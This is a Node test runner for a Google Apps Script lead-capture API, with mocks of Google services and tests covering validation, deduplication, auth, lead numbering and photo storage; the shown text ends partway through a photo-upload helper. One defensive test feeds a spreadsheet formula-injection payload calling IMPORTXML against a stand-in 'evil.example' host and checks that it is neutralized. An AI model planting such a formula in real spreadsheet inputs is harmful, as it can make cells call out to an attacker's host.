/* ============================================================
   BLUEGRID API — LOCAL TEST RUNNER

   Runs the Apps Script modules on Node against in-memory mocks of
   SpreadsheetApp, LockService, PropertiesService, MailApp, Session,
   Utilities, and ContentService.

   Purpose: prove the lead pipeline works before anything is deployed
   to Google, and re-prove it after every code change without needing
   a spreadsheet or credentials.

   Run from this folder:   node localTestRunner.js

   This file is a development tool. It is NOT pasted into the Apps
   Script editor — only the .gs files are.
============================================================ */

const fs = require('fs');

const path = require('path');

const vm = require('vm');

/* ============================================================
   IN-MEMORY SPREADSHEET MOCK
============================================================ */

function createRange(sheet, row, column, numRows, numColumns)
{

    return {

        getValues: function ()
        {

            const out = [];

            for (let r = 0; r < numRows; r += 1)
            {

                const rowValues = [];

                for (let c = 0; c < numColumns; c += 1)
                {

                    rowValues.push(sheet.readCell(row + r, column + c));

                }

                out.push(rowValues);

            }

            return out;

        },

        setValues: function (values)
        {

            values.forEach(function (rowValues, r)
            {

                rowValues.forEach(function (value, c)
                {

                    sheet.writeCell(row + r, column + c, value);

                });

            });

            return this;

        },

        setValue: function (value)
        {

            sheet.writeCell(row, column, value);

            return this;

        },

        setNumberFormat: function () { return this; },

        setFontWeight: function () { return this; },

        setBackground: function () { return this; },

        setFontColor: function () { return this; }

    };

}

function createSheet(name)
{

    const sheet = {

        name: name,

        cells: {},

        frozenRows: 0,

        maxColumns: 30,

        key: function (row, column) { return row + ':' + column; },

        readCell: function (row, column)
        {

            const value = this.cells[this.key(row, column)];

            return (value === undefined) ? '' : value;

        },

        writeCell: function (row, column, value)
        {

            this.cells[this.key(row, column)] = value;

        },

        getName: function () { return this.name; },

        getMaxColumns: function () { return this.maxColumns; },

        getMaxRows: function () { return Math.max(this.getLastRow(), 1000); },

        insertColumnsAfter: function (after, howMany)
        {

            this.maxColumns += howMany;

        },

        getLastRow: function ()
        {

            let last = 0;

            Object.keys(this.cells).forEach(function (cellKey)
            {

                const row = Number(cellKey.split(':')[0]);

                if (row > last) { last = row; }

            });

            return last;

        },

        getRange: function (row, column, numRows, numColumns)
        {

            return createRange(this, row, column, numRows || 1, numColumns || 1);

        },

        appendRow: function (values)
        {

            const row = this.getLastRow() + 1;

            const self = this;

            values.forEach(function (value, index)
            {

                self.writeCell(row, index + 1, value);

            });

        },

        deleteRow: function (rowToDelete)
        {

            const last = this.getLastRow();

            const self = this;

            Object.keys(this.cells).forEach(function (cellKey)
            {

                const row = Number(cellKey.split(':')[0]);

                if (row === rowToDelete) { delete self.cells[cellKey]; }

            });

            for (let row = rowToDelete + 1; row <= last; row += 1)
            {

                for (let column = 1; column <= this.maxColumns; column += 1)
                {

                    const fromKey = this.key(row, column);

                    if (Object.prototype.hasOwnProperty.call(this.cells, fromKey))
                    {

                        this.cells[this.key(row - 1, column)] = this.cells[fromKey];

                        delete this.cells[fromKey];

                    }

                }

            }

        },

        setFrozenRows: function (count) { this.frozenRows = count; },

        getFrozenRows: function () { return this.frozenRows; },

        setColumnWidth: function () { return this; }

    };

    return sheet;

}

function createSpreadsheet()
{

    return {

        sheets: {},

        namedRanges: [],

        getSheetByName: function (name) { return this.sheets[name] || null; },

        insertSheet: function (name)
        {

            this.sheets[name] = createSheet(name);

            return this.sheets[name];

        },

        getRange: function (a1) { return { a1: a1 }; },

        getNamedRanges: function ()
        {

            const self = this;

            return this.namedRanges.map(function (entry)
            {

                return {

                    getName: function () { return entry.name; },

                    remove: function ()
                    {

                        self.namedRanges = self.namedRanges.filter(function (candidate)
                        {

                            return candidate !== entry;

                        });

                    }

                };

            });

        },

        setNamedRange: function (name, range)
        {

            this.namedRanges.push({ name: name, range: range });

        }

    };

}

/* ============================================================
   IN-MEMORY DRIVE MOCK

   Enough of DriveApp to exercise photo storage: folders by name,
   files by name, ids, urls, and sharing calls recorded rather than
   performed. Iterators mimic Google's hasNext/next rather than
   returning arrays, because the production code is written against
   that shape and a friendlier mock would not prove it works.
============================================================ */

function createDriveIterator(items)
{

    let cursor = 0;

    return {

        hasNext: function () { return cursor < items.length; },

        next: function ()
        {

            const item = items[cursor];

            cursor += 1;

            return item;

        }

    };

}

let driveIdCounter = 0;

const driveSharingCalls = [];

const cacheStore = {};

function createDriveFile(name, mimeType, bytes)
{

    driveIdCounter += 1;

    const id = 'file-' + driveIdCounter;

    return {

        id: id,

        name: name,

        mimeType: mimeType,

        bytes: bytes,

        getId: function () { return this.id; },

        getName: function () { return this.name; },

        getUrl: function () { return 'https://drive.google.com/file/d/' + this.id + '/view'; },

        /* Real DriveApp reports the stored byte count; the combined
           size cap reads it, so the mock has to model it honestly. */

        getSize: function () { return (this.bytes && this.bytes.length) ? this.bytes.length : 0; },

        getBlob: function () { return { bytes: this.bytes }; }

    };

}

function createDriveFolder(name)
{

    driveIdCounter += 1;

    return {

        id: 'folder-' + driveIdCounter,

        name: name,

        files: [],

        folders: [],

        trashed: false,

        getId: function () { return this.id; },

        getName: function () { return this.name; },

        setName: function (newName) { this.name = newName; return this; },

        /* checkPhotoStorage() trashes its probe folder. Modelled so
           the harness proves the cleanup runs rather than silently
           swallowing a missing-method throw. */

        setTrashed: function (state)
        {

            this.trashed = state === true;

            if (this.trashed)
            {

                driveRoot.folders = driveRoot.folders.filter(function (child)
                {

                    return child.id !== this.id;

                }, this);

            }

            return this;

        },

        getUrl: function () { return 'https://drive.google.com/drive/folders/' + this.id; },

        getFiles: function () { return createDriveIterator(this.files.slice()); },

        getFilesByName: function (wanted)
        {

            return createDriveIterator(this.files.filter(function (file)
            {

                return file.name === wanted;

            }));

        },

        getFolders: function () { return createDriveIterator(this.folders.slice()); },

        getFoldersByName: function (wanted)
        {

            return createDriveIterator(this.folders.filter(function (folder)
            {

                return folder.name === wanted;

            }));

        },

        createFolder: function (childName)
        {

            const folder = createDriveFolder(childName);

            this.folders.push(folder);

            return folder;

        },

        createFile: function (blob)
        {

            const file = createDriveFile(blob.name, blob.mimeType, blob.bytes);

            this.files.push(file);

            return file;

        },

        setSharing: function (access, permission)
        {

            driveSharingCalls.push({ folder: this.name, access: access, permission: permission });

            return this;

        },

        viewers: [],

        editors: [],

        getViewers: function ()
        {

            return this.viewers.map(function (email)
            {

                return { getEmail: function () { return email; } };

            });

        },

        getEditors: function ()
        {

            return this.editors.map(function (email)
            {

                return { getEmail: function () { return email; } };

            });

        },

        removeViewer: function (emailAddress)
        {

            driveSharingCalls.push({ folder: this.name, removedViewer: emailAddress });

            this.viewers = this.viewers.filter(function (email)
            {

                return email !== emailAddress;

            });

            return this;

        },

        addViewer: function (emailAddress)
        {

            driveSharingCalls.push({ folder: this.name, viewer: emailAddress });

            if (this.viewers.indexOf(emailAddress) === -1)
            {

                this.viewers.push(emailAddress);

            }

            return this;

        }

    };

}

const driveRoot = { folders: [] };

const scriptProperties = { MODULE_API_KEY: 'test-api-key' };

/* Walks the whole tree because getFolderById does not care where a
   folder sits, and the per-lead folders are one level down. */

function findMockFolderById(id)
{

    const queue = driveRoot.folders.slice();

    while (queue.length)
    {

        const folder = queue.shift();

        if (folder.id === id)
        {

            return folder;

        }

        folder.folders.forEach(function (child) { queue.push(child); });

    }

    return null;

}

/* ============================================================
   GOOGLE SERVICE MOCKS
============================================================ */

const spreadsheet = createSpreadsheet();

const sentEmails = [];

let failNextEmail = false;

const sandbox = {

    console: console,

    Date: Date,

    JSON: JSON,

    Math: Math,

    Object: Object,

    Array: Array,

    String: String,

    Number: Number,

    Boolean: Boolean,

    isNaN: isNaN,

    encodeURI: encodeURI,

    SpreadsheetApp: {

        getActiveSpreadsheet: function () { return spreadsheet; },

        openById: function () { return spreadsheet; }

    },

    /* Script cache backing the upload throttle. Deliberately ignores
       expiry — the tests drive the counter directly rather than
       waiting an hour, and a TTL the tests never reach would only add
       a moving part. */

    CacheService: {

        getScriptCache: function ()
        {

            return {

                get: function (key)
                {

                    return Object.prototype.hasOwnProperty.call(cacheStore, key)
                        ? cacheStore[key]
                        : null;

                },

                put: function (key, value)
                {

                    cacheStore[key] = String(value);

                },

                remove: function (key) { delete cacheStore[key]; }

            };

        }

    },

    LockService: {

        getScriptLock: function ()
        {

            return {

                waitLock: function () { return true; },

                releaseLock: function () { return true; }

            };

        }

    },

    PropertiesService: {

        getScriptProperties: function ()
        {

            return {

                getProperty: function (key)
                {

                    return Object.prototype.hasOwnProperty.call(scriptProperties, key)
                        ? scriptProperties[key]
                        : null;

                },

                setProperty: function (key, value)
                {

                    scriptProperties[key] = value;

                    return this;

                }

            };

        }

    },

    DriveApp: {

        Access: { ANYONE_WITH_LINK: 'ANYONE_WITH_LINK' },

        Permission: { VIEW: 'VIEW' },

        getFolderById: function (id)
        {

            const found = findMockFolderById(id);

            if (!found)
            {

                throw new Error('No folder with id ' + id);

            }

            return found;

        },

        getFoldersByName: function (name)
        {

            return createDriveIterator(driveRoot.folders.filter(function (folder)
            {

                return folder.name === name;

            }));

        },

        createFolder: function (name)
        {

            const folder = createDriveFolder(name);

            driveRoot.folders.push(folder);

            return folder;

        }

    },

    MailApp: {

        sendEmail: function (optionsOrTo, subject, body)
        {

            if (failNextEmail)
            {

                failNextEmail = false;

                throw new Error('Simulated mail failure');

            }

            if (typeof optionsOrTo === 'string')
            {

                sentEmails.push({ to: optionsOrTo, subject: subject, body: body });

            }
            else
            {

                sentEmails.push(optionsOrTo);

            }

        }

    },

    Session: {

        getScriptTimeZone: function () { return 'America/New_York'; }

    },

    Utilities: {

        formatDate: function (date) { return date.toISOString(); },

        base64Decode: function (base64)
        {

            return Array.from(Buffer.from(String(base64), 'base64'));

        },

        newBlob: function (bytes, mimeType, name)
        {

            return { bytes: bytes, mimeType: mimeType, name: name };

        }

    },

    ContentService: {

        MimeType: { JSON: 'application/json' },

        createTextOutput: function (text)
        {

            return {

                content: text,

                setMimeType: function () { return this; },

                getContent: function () { return this.content; }

            };

        }

    }

};

sandbox.globalThis = sandbox;

vm.createContext(sandbox);

/* ============================================================
   LOAD THE .gs MODULES INTO ONE SHARED SCOPE
   (this is how Apps Script itself evaluates a project)
============================================================ */

const moduleFiles = [
    'config.gs',
    'utilities.gs',
    'validation.gs',
    'leads.gs',
    'photoStorage.gs',
    'notifications.gs',
    'routes.gs',
    'Code.gs'
];

moduleFiles.forEach(function (fileName)
{

    const source = fs.readFileSync(path.join(__dirname, fileName), 'utf8');

    try
    {

        vm.runInContext(source, sandbox, { filename: fileName });

    }
    catch (loadError)
    {

        console.error('FAILED TO LOAD ' + fileName + ': ' + loadError.message);

        process.exit(1);

    }

});

/* Function declarations land on the context object automatically, but
   top-level `const` does not — so the constants are re-exported here
   for the assertions below. Apps Script itself has no such split;
   this is purely a Node/vm detail. */

vm.runInContext(
    'globalThis.constants = {'
    + ' SHEET_NAMES: SHEET_NAMES,'
    + ' LEADS_HEADERS: LEADS_HEADERS,'
    + ' ERROR_LOG_HEADERS: ERROR_LOG_HEADERS,'
    + ' ENUM_VALUES: ENUM_VALUES,'
    + ' DEFAULT_NOTIFICATION_EMAIL: DEFAULT_NOTIFICATION_EMAIL,'
    + ' MAX_PHOTOS_PER_LEAD: MAX_PHOTOS_PER_LEAD,'
    + ' MAX_PHOTO_BYTES: MAX_PHOTO_BYTES,'
    + ' PHOTO_ROOT_FOLDER_NAME: PHOTO_ROOT_FOLDER_NAME,'
    + ' PHOTO_ACCESS_MODES: PHOTO_ACCESS_MODES,'
    + ' DEFAULT_PHOTO_ACCESS: DEFAULT_PHOTO_ACCESS,'
    + ' DEFAULT_PHOTO_VIEWER_EMAIL: DEFAULT_PHOTO_VIEWER_EMAIL,'
    + ' MAX_TOTAL_PHOTO_BYTES: MAX_TOTAL_PHOTO_BYTES,'
    + ' DEFAULT_PHOTO_UPLOADS_PER_HOUR: DEFAULT_PHOTO_UPLOADS_PER_HOUR'
    + ' };',
    sandbox
);

/* ============================================================
   CONFIG TAB HELPERS  (test-only)

   getConfig() memoises into a top-level `cachedConfig`, which in
   Apps Script lives for exactly one execution. Node keeps one context
   alive for the whole run, so a test that edits the config tab has to
   drop that cache itself to see its own write. Scripts share the
   context's global lexical scope, so assigning to the binding works.
============================================================ */

function setConfigValue(key, value)
{

    const sheet = sandbox.getOrCreateSheet(sandbox.constants.SHEET_NAMES.config);

    const lastRow = sheet.getLastRow();

    let targetRow = -1;

    if (lastRow > 1)
    {

        sheet.getRange(2, 1, lastRow - 1, 2).getValues().forEach(function (row, index)
        {

            if (String(row[0]).trim() === key)
            {

                targetRow = index + 2;

            }

        });

    }

    if (targetRow === -1)
    {

        sheet.appendRow([key, value]);

    }
    else
    {

        sheet.getRange(targetRow, 2, 1, 1).setValues([[value]]);

    }

    vm.runInContext('cachedConfig = null;', sandbox);

}

function readFreshConfig()
{

    vm.runInContext('cachedConfig = null;', sandbox);

    return sandbox.getConfig();

}

/* ============================================================
   TEST HARNESS
============================================================ */

let passed = 0;

let failed = 0;

function check(label, condition, detail)
{

    if (condition)
    {

        passed += 1;

        console.log('  PASS  ' + label);

    }
    else
    {

        failed += 1;

        console.log('  FAIL  ' + label + (detail ? '  ->  ' + detail : ''));

    }

}

function parse(response)
{

    return JSON.parse(response.getContent());

}

function basePayload(overrides)
{

    const payload = {

        referenceId: 'BG-' + Date.now(),

        submittedAt: new Date().toISOString(),

        fullName: 'Dale Compton',

        phone: '(606) 555-0142',

        email: 'dale.compton@example.com',

        propertyAddress: '1284 Twin Branch Rd, Ashland, KY 41101',

        estimatedAcres: '3.5',

        serviceNeeded: 'Forestry Mulching',

        projectDescription: 'About 3 acres of overgrown brush behind the house.',

        preferredContactMethod: 'Text',

        preferredTime: 'Evening',

        photoCount: 2,

        photoNames: ['backLot1.jpg', 'backLot2.jpg'],

        sourcePage: 'services/forestryMulching.html#estimateForm',

        leadSource: 'website',

        utmSource: '',

        utmMedium: '',

        utmCampaign: '',

        facebookCampaign: '',

        companyWebsite: ''

    };

    Object.keys(overrides || {}).forEach(function (key)
    {

        payload[key] = overrides[key];

    });

    return payload;

}

function leadsSheet()
{

    return sandbox.getOrCreateSheet(sandbox.constants.SHEET_NAMES.leads);

}

function errorLogSheet()
{

    return sandbox.getOrCreateSheet(sandbox.constants.SHEET_NAMES.errorLog);

}

/* ============================================================
   TESTS
============================================================ */

console.log('\nBLUEGRID API — LOCAL TEST RUN\n' + '='.repeat(46) + '\n');

console.log('SETUP');

const setupMessage = sandbox.setupSpreadsheet();

check('setupSpreadsheet runs', typeof setupMessage === 'string');

check('leads sheet created', Boolean(spreadsheet.getSheetByName('leads')));

check('errorLog sheet created', Boolean(spreadsheet.getSheetByName('errorLog')));

check('config sheet created', Boolean(spreadsheet.getSheetByName('config')));

check('dropdowns sheet created', Boolean(spreadsheet.getSheetByName('dropdowns')));

check('dashboardMetrics sheet created', Boolean(spreadsheet.getSheetByName('dashboardMetrics')));

const headerRow = leadsSheet().getRange(1, 1, 1, sandbox.constants.LEADS_HEADERS.length).getValues()[0];

check('leads row 1 = 29 canonical headers',
    headerRow.length === 29 && headerRow.join(',') === sandbox.constants.LEADS_HEADERS.join(','));

/* The append-only rule is what keeps rows written before the
   identifier split readable, so it is asserted rather than trusted:
   the two columns added on 2026-08-13 must sit at the end, after
   lastUpdated, not next to the fields they relate to. */

check('referenceId and photoFolderUrl appended, not inserted',
    sandbox.constants.LEADS_HEADERS[26] === 'lastUpdated'
    && sandbox.constants.LEADS_HEADERS[27] === 'referenceId'
    && sandbox.constants.LEADS_HEADERS[28] === 'photoFolderUrl');

const errorHeaderRow = errorLogSheet()
    .getRange(1, 1, 1, sandbox.constants.ERROR_LOG_HEADERS.length).getValues()[0];

check('errorLog row 1 = 5 canonical headers',
    errorHeaderRow.join(',') === 'timestamp,leadId,functionName,errorMessage,stackTrace');

console.log('\nIDEMPOTENCY');

const sheetCountBefore = Object.keys(spreadsheet.sheets).length;

const namedBefore = spreadsheet.namedRanges.length;

const configRowsBefore = spreadsheet.getSheetByName('config').getLastRow();

sandbox.setupSpreadsheet();

sandbox.setupSpreadsheet();

check('re-running setup creates no duplicate sheets',
    Object.keys(spreadsheet.sheets).length === sheetCountBefore,
    'before=' + sheetCountBefore + ' after=' + Object.keys(spreadsheet.sheets).length);

check('re-running setup creates no duplicate named ranges',
    spreadsheet.namedRanges.length === namedBefore,
    'before=' + namedBefore + ' after=' + spreadsheet.namedRanges.length);

check('re-running setup creates no duplicate config rows',
    spreadsheet.getSheetByName('config').getLastRow() === configRowsBefore,
    'before=' + configRowsBefore + ' after=' + spreadsheet.getSheetByName('config').getLastRow());

console.log('\nPING');

const ping = parse(sandbox.doGet({ parameter: { action: 'ping' } }));

check('ping succeeds', ping.success === true);

check('ping reports module', ping.data && ping.data.module === 'forestryModule');

console.log('\nCREATE — HAPPY PATH');

sentEmails.length = 0;

const happyPayload = basePayload();

const created = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify(happyPayload) }

}));

check('create succeeds', created.success === true, JSON.stringify(created.error || {}));

check('lead row written to sheet', leadsSheet().getLastRow() === 2);

check('status forced to new', created.data.lead.status === 'new');

check('photoUrls empty when nothing was uploaded', Array.isArray(created.data.lead.photoUrls)
    && created.data.lead.photoUrls.length === 0);

check('lastUpdated stamped', Boolean(created.data.lead.lastUpdated));

check('referenceId preserved from client',
    created.data.lead.referenceId === happyPayload.referenceId);

check('first lead is BG-0001', created.data.lead.leadId === 'BG-0001',
    'got ' + created.data.lead.leadId);

check('leadId is not the referenceId',
    created.data.lead.leadId !== created.data.lead.referenceId);

check('owner email shows the reference, not the internal number',
    sentEmails[0].body.indexOf('Reference  : ' + happyPayload.referenceId) !== -1);

check('owner email also carries the internal lead number',
    sentEmails[0].body.indexOf('Lead       : BG-0001') !== -1);

check('auto-reply quotes the referenceId as the confirmation number',
    sentEmails[1].body.indexOf('Reference number  : ' + happyPayload.referenceId) !== -1);

check('auto-reply never shows the sequential number',
    sentEmails[1].body.indexOf('BG-0001') === -1);

console.log('\nEMAIL — OWNER ONLY');

check('exactly two emails sent (owner + auto-reply)', sentEmails.length === 2,
    'sent=' + sentEmails.length);

const ownerEmail = sentEmails[0];

check('owner email goes to Bluegridls@gmail.com', ownerEmail.to === 'Bluegridls@gmail.com',
    'to=' + ownerEmail.to);

check('NO cc to Nulo Studio', !ownerEmail.cc);

check('no recipient anywhere is admin@nulostudio.com',
    JSON.stringify(sentEmails).indexOf('admin@nulostudio.com') === -1);

check('replyTo is the customer', ownerEmail.replyTo === happyPayload.email);

check('owner email contains name', ownerEmail.body.indexOf('Dale Compton') !== -1);

check('owner email contains phone', ownerEmail.body.indexOf('(606) 555-0142') !== -1);

check('owner email contains email', ownerEmail.body.indexOf('dale.compton@example.com') !== -1);

check('owner email contains message',
    ownerEmail.body.indexOf('overgrown brush behind the house') !== -1);

check('owner email contains timestamp', ownerEmail.body.indexOf('Submitted  :') !== -1);

check('auto-reply goes to the customer', sentEmails[1].to === happyPayload.email);

console.log('\nDEDUPE');

const replay = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify(happyPayload) }

}));

check('replay succeeds', replay.success === true);

check('replay flagged duplicate', replay.data.duplicate === true);

check('replay wrote no second row', leadsSheet().getLastRow() === 2);

console.log('\nHONEYPOT');

sentEmails.length = 0;

const trapped = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify(basePayload({

        referenceId: 'BG-' + (Date.now() + 5),

        companyWebsite: 'http://spam.example'

    })) }

}));

check('honeypot returns fake success', trapped.success === true);

check('honeypot flagged', trapped.data.honeypot === true);

check('honeypot wrote no row', leadsSheet().getLastRow() === 2);

check('honeypot sent no email', sentEmails.length === 0);

console.log('\nVALIDATION');

const rowsBeforeInvalid = leadsSheet().getLastRow();

const invalid = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify({ fullName: '', phone: 'x', email: 'nope' }) }

}));

check('invalid payload rejected', invalid.success === false);

check('error code is VALIDATION_ERROR', invalid.error.code === 'VALIDATION_ERROR');

check('field errors returned', Boolean(invalid.error.fields && invalid.error.fields.fullName));

check('invalid payload wrote no lead row', leadsSheet().getLastRow() === rowsBeforeInvalid);

const badAcres = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify(basePayload({

        referenceId: 'BG-' + (Date.now() + 9),

        estimatedAcres: 'abc'

    })) }

}));

check('non-numeric acres rejected', badAcres.success === false
    && Boolean(badAcres.error.fields.estimatedAcres));

const badEnum = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify(basePayload({

        referenceId: 'BG-' + (Date.now() + 11),

        serviceNeeded: 'Underwater Basket Weaving'

    })) }

}));

check('invalid serviceNeeded enum rejected', badEnum.success === false
    && Boolean(badEnum.error.fields.serviceNeeded));

console.log('\nERROR LOG');

check('validation failure recorded in errorLog', errorLogSheet().getLastRow() > 1);

const loggedRow = errorLogSheet()
    .getRange(errorLogSheet().getLastRow(), 1, 1, 5).getValues()[0];

check('errorLog row has timestamp', Boolean(loggedRow[0]));

check('errorLog row has functionName', Boolean(loggedRow[2]));

check('errorLog row has errorMessage', Boolean(loggedRow[3]));

console.log('\nSHEET IS THE AUDIT TRAIL (email failure must not fail the lead)');

sentEmails.length = 0;

failNextEmail = true;

const rowsBeforeMailFail = leadsSheet().getLastRow();

const errorRowsBeforeMailFail = errorLogSheet().getLastRow();

const mailFailLead = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify(basePayload({

        referenceId: 'BG-' + (Date.now() + 21)

    })) }

}));

check('lead still reported successful when email throws', mailFailLead.success === true);

check('lead row still written when email throws',
    leadsSheet().getLastRow() === rowsBeforeMailFail + 1);

check('email failure recorded in errorLog',
    errorLogSheet().getLastRow() > errorRowsBeforeMailFail);

console.log('\nFORMULA INJECTION');

const injected = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify(basePayload({

        referenceId: 'BG-' + (Date.now() + 31),

        fullName: '=IMPORTXML("http://evil.example","//a")'

    })) }

}));

check('formula-injection payload neutralized',
    injected.success === true && injected.data.lead.fullName.charAt(0) === "'",
    'stored=' + (injected.data.lead && injected.data.lead.fullName));

console.log('\nHEADER SELF-HEAL');

leadsSheet().getRange(1, 3, 1, 1).setValue('customerName');

const healed = parse(sandbox.doGet({

    parameter: { action: 'leads.list', apiKey: 'test-api-key' }

}));

const headersAfterHeal = leadsSheet()
    .getRange(1, 1, 1, sandbox.constants.LEADS_HEADERS.length).getValues()[0];

check('foreign header repaired to canonical', headersAfterHeal[2] === 'fullName');

check('data survived header repair', healed.success === true && healed.data.count > 0);

console.log('\nAUTH');

const unauthorizedList = parse(sandbox.doGet({ parameter: { action: 'leads.list' } }));

check('leads.list without key -> UNAUTHORIZED',
    unauthorizedList.success === false && unauthorizedList.error.code === 'UNAUTHORIZED');

const authorizedList = parse(sandbox.doGet({

    parameter: { action: 'leads.list', apiKey: 'test-api-key' }

}));

check('leads.list with key succeeds', authorizedList.success === true);

check('photoNames parsed back to a real array',
    Array.isArray(authorizedList.data.leads[authorizedList.data.leads.length - 1].photoNames));

console.log('\nUPDATE');

const updated = parse(sandbox.doPost({

    parameter: { action: 'leads.update', apiKey: 'test-api-key' },

    postData: { contents: JSON.stringify({

        leadId: created.data.lead.leadId,

        status: 'contacted',

        estimateAmount: '2400'

    }) }

}));

check('update succeeds', updated.success === true, JSON.stringify(updated.error || {}));

check('status changed', updated.data.lead.status === 'contacted');

check('estimateAmount written', updated.data.lead.estimateAmount === '2400');

const badStatus = parse(sandbox.doPost({

    parameter: { action: 'leads.update', apiKey: 'test-api-key' },

    postData: { contents: JSON.stringify({ leadId: created.data.lead.leadId, status: 'banana' }) }

}));

check('invalid status rejected', badStatus.success === false
    && badStatus.error.code === 'VALIDATION_ERROR');

const missingLead = parse(sandbox.doPost({

    parameter: { action: 'leads.update', apiKey: 'test-api-key' },

    postData: { contents: JSON.stringify({ leadId: 'BG-9999', status: 'lost' }) }

}));

check('unknown leadId -> NOT_FOUND', missingLead.success === false
    && missingLead.error.code === 'NOT_FOUND');

const unauthorizedUpdate = parse(sandbox.doPost({

    parameter: { action: 'leads.update' },

    postData: { contents: JSON.stringify({ leadId: created.data.lead.leadId, status: 'lost' }) }

}));

check('update without key -> UNAUTHORIZED', unauthorizedUpdate.success === false
    && unauthorizedUpdate.error.code === 'UNAUTHORIZED');

console.log('\nUNKNOWN ACTION');

const unknown = parse(sandbox.doGet({ parameter: { action: 'leads.explode' } }));

check('unknown action -> UNKNOWN_ACTION', unknown.success === false
    && unknown.error.code === 'UNKNOWN_ACTION');

/* ============================================================
   SEQUENTIAL LEAD NUMBERING
============================================================ */

console.log('\nSEQUENTIAL LEAD NUMBERING');

/* Numbering is derived from the sheet, so these run against whatever
   the tests above already wrote rather than against a clean sheet —
   which is the harder and more realistic case. */

function createLead(overrides)
{

    return parse(sandbox.doPost({

        parameter: { action: 'leads.create' },

        postData: { contents: JSON.stringify(basePayload(overrides)) }

    }));

}

const highestSoFar = sandbox.findHighestLeadNumber(leadsSheet());

const sequentialA = createLead({ referenceId: 'BG-' + (Date.now() + 101) });

const sequentialB = createLead({ referenceId: 'BG-' + (Date.now() + 102) });

const sequentialC = createLead({ referenceId: 'BG-' + (Date.now() + 103) });

check('leadIds increment by one',
    sandbox.parseLeadNumber(sequentialB.data.lead.leadId)
        === sandbox.parseLeadNumber(sequentialA.data.lead.leadId) + 1
    && sandbox.parseLeadNumber(sequentialC.data.lead.leadId)
        === sandbox.parseLeadNumber(sequentialB.data.lead.leadId) + 1,
    [sequentialA, sequentialB, sequentialC].map(function (r) { return r.data.lead.leadId; }).join(','));

check('numbering continues from the highest already in the sheet',
    sandbox.parseLeadNumber(sequentialA.data.lead.leadId) === highestSoFar + 1);

check('every leadId is unique',
    [sequentialA, sequentialB, sequentialC]
        .map(function (r) { return r.data.lead.leadId; })
        .filter(function (id, index, all) { return all.indexOf(id) === index; })
        .length === 3);

check('every referenceId is distinct from every other',
    sequentialA.data.lead.referenceId !== sequentialB.data.lead.referenceId
    && sequentialB.data.lead.referenceId !== sequentialC.data.lead.referenceId);

check('leadId zero-padded to four digits', /^BG-\d{4}$/.test(sequentialA.data.lead.leadId),
    sequentialA.data.lead.leadId);

check('padding is a minimum, not a ceiling',
    sandbox.padLeadNumber(1) === '0001'
    && sandbox.padLeadNumber(42) === '0042'
    && sandbox.padLeadNumber(9999) === '9999'
    && sandbox.padLeadNumber(10000) === '10000'
    && sandbox.padLeadNumber(123456) === '123456');

/* The guard that stops an unmigrated sheet sending the next lead to
   BG-1786635839699. Without it, one legacy row poisons the counter
   for the life of the spreadsheet. */

check('legacy long-form ids are not read as sequence numbers',
    sandbox.parseLeadNumber('BG-1786635839698') === 0
    && sandbox.parseLeadNumber('BG-0001') === 1
    && sandbox.parseLeadNumber('BG-0042') === 42
    && sandbox.parseLeadNumber('') === 0
    && sandbox.parseLeadNumber('nonsense') === 0);

/* ── A retry must cost nothing ── */

const rowsBeforeRetry = leadsSheet().getLastRow();

const retryPayload = basePayload({ referenceId: 'BG-' + (Date.now() + 111) });

const firstAttempt = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify(retryPayload) }

}));

const secondAttempt = parse(sandbox.doPost({

    parameter: { action: 'leads.create' },

    postData: { contents: JSON.stringify(retryPayload) }

}));

const afterRetry = createLead({ referenceId: 'BG-' + (Date.now() + 112) });

check('retry writes exactly one row',
    leadsSheet().getLastRow() === rowsBeforeRetry + 2,
    'expected +2 rows (one retried lead, one following lead)');

check('retry returns the original leadId',
    secondAttempt.data.duplicate === true
    && secondAttempt.data.lead.leadId === firstAttempt.data.lead.leadId);

check('a duplicate consumes no sequence number',
    sandbox.parseLeadNumber(afterRetry.data.lead.leadId)
        === sandbox.parseLeadNumber(firstAttempt.data.lead.leadId) + 1,
    firstAttempt.data.lead.leadId + ' then ' + afterRetry.data.lead.leadId);

/* ── Concurrency ──
   Two submissions interleaved inside the critical section. The real
   protection is LockService, which the mock grants freely, so what is
   provable here is the half that has to be true anyway: allocation
   reads committed state, so it cannot hand out a number that is
   already on the sheet. */

const beforeConcurrent = sandbox.findHighestLeadNumber(leadsSheet());

const allocatedFirst = sandbox.allocateNextLeadId(leadsSheet());

const concurrentLead = createLead({ referenceId: 'BG-' + (Date.now() + 121) });

const allocatedAfter = sandbox.allocateNextLeadId(leadsSheet());

check('allocation reflects committed rows, never a stale read',
    allocatedFirst === 'BG-' + sandbox.padLeadNumber(beforeConcurrent + 1)
    && concurrentLead.data.lead.leadId === allocatedFirst
    && allocatedAfter === 'BG-' + sandbox.padLeadNumber(beforeConcurrent + 2));

/* ============================================================
   PHOTO STORAGE
============================================================ */

console.log('\nPHOTO STORAGE');

const onePixelPng = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42m'
    + 'P8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';

/* How many files actually reached the lead's Drive folder. The point
   of most of the policy tests is that a rejected upload leaves nothing
   behind, and only the mock Drive can answer that. */

function countFilesUnderReference(referenceId)
{

    const roots = driveRoot.folders.filter(function (folder)
    {

        return folder.name === sandbox.constants.PHOTO_ROOT_FOLDER_NAME;

    });

    let total = 0;

    roots.forEach(function (root)
    {

        root.folders.forEach(function (leadFolder)
        {

            /* Matched by prefix as well as exact name: labelPhotoFolder
               renames to "BG-0001 · Name · BG-<ref>" once a lead row
               exists, and the reference stays on the end. */

            if (leadFolder.name === referenceId
                || leadFolder.name.indexOf(referenceId) !== -1)
            {

                total += leadFolder.files.length;

            }

        });

    });

    return total;

}

function uploadPhoto(referenceId, index, fileName, overrides)
{

    const payload = {

        referenceId: referenceId,

        index: index,

